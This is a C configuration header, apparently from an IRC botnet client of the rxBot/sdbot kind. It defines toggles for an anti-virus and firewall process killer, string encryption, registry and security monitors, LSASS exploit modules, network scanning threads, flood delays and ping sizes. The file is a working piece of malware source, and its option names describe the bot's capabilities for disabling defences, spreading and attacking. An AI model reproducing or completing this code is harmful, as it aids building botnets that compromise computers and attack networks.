
#define NO_IDENT      // disables Ident server
#define NO_CRASH      // disables Crash function
#define NO_REALNICK   // disables Real nick function
#define NO_AVFW_KILL  // disables Anti-Virus & Firewall process killer
#define NO_REGISTRY   // disables Registry Monitor on startup function
#define NO_SECSYSTEM  // disables System Secure Monitor on startup function
#define NO_CRYPT      // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
#define DEBUG_CRYPT   // enables bot string dump in order to try to debug the Crypt() function


#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		500
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		2
#define MAX_LINES		500
#define MAXSCANTHRD		600
#define MAXSCANTIME		800
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		2000
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32

#undef NO_LSASS1
#undef NO_LSASS1LSASS

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()
